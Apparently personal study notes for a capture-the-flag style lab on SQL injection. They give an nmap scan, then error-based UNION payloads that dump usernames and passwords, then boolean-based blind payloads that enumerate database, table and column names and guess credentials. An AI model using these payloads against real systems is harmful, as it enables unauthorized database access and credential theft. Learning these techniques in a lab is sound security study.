- to check the port:
- nmap -A -T4 -p 3306,3389,445,139,135 10.48.156.27
  
## to complete a mission
- refresh the page
- type ' to get the sql syntax error message.
- Try typing an apostrophe ( ' ) after the id=1 and press enter. And you'll see this returns an error informing you of an error in your syntax. The fact that you've received this error message confirms the existence of an Injection vulnerability. We can now exploit this vulnerability and use the error messages to learn more about the database structure.
- put 1 union select 1 then 1,2 then 1, 2, 3. until the error message is gone.
- https://website.thm/article?id=1 UNION SELECT 1, 2, 3
- replace 3 with database(), the outcom will remain the same.
- 0 UNION SELECT 1,2,database()
- You'll now see where the number 3 was previously displayed; it now shows the name of the database, which is sqli_one.
- to display the databases
- 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
- There are a couple of new things to learn in this query. Firstly, the method group_concat() gets the specified column (in our case, table_name) from multiple returned rows and puts it into one string separated by commas. The next thing is the information_schema database; every user of the database has access to this, and it contains information about all the databases and tables the user has access to. In this particular query, we're interested in listing all the tables in the sqli_one database, which is article and staff_users.
- to get the tables under the specific database:
- 0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
- 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
- Again, we use the group_concat method to return all of the rows into one string and make it easier to read. We've also added ,':', to split the username and password from each other. Instead of being separated by a comma, we've chosen the HTML <br> tag that forces each result to be on a separate line to make for easier reading.

## Boolean Based
- Injection refers to the response we receive from our injection attempts, which could be a true/false, yes/no, on/off, 1/0 or any response that can only have two outcomes. That outcome confirms that our Injection payload was either successful or not. On the first inspection, you may feel like this limited response can't provide much information. Still, with just these two responses, it's possible to enumerate a whole database structure and contents.
- select * from users where username = '%username%' LIMIT 1;
- The browser body contains  {"taken":true}. This endpoint replicates a common feature found on many signup forms, which checks whether a username has already been registered to prompt the user to choose a different username. Because the taken value is set to true, we can assume the username admin is already registered. We can confirm this by changing the username in the mock browser's address bar from admin to admin123, and upon pressing enter, you'll see the value taken has now changed to false.
- admin123' UNION SELECT 1;--
- turns true
- admin123' UNION SELECT 1,2,3;--
- admin123' UNION SELECT 1,2,3 where database() like '%';--
- admin123' UNION SELECT 1,2,3 where database() like 's%';--
- Now you move on to the next character of the database name until you find another true response, for example, 'sa%', 'sb%', 'sc%', etc. Keep on with this process until you discover all the characters of the database name, which is sqli_three.
- admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
- false response confirms that there is no table in the specified database.
- admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
- admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
- Again,  you'll need to cycle through letters, numbers and characters until you find a match. As you're looking for multiple results, you'll have to add this to your payload each time you find a new column name to avoid discovering the same one. For example, once you've found the column named id, you'll append that to your original payload (as seen below).
- admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
- Repeating this process three times will enable you to discover the columns' id, username and password. Which now you can use to query the users table for login credentials. First, you'll need to discover a valid username, which you can use the payload below:
- admin123' UNION SELECT 1,2,3 from users where username like 'a%
- admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
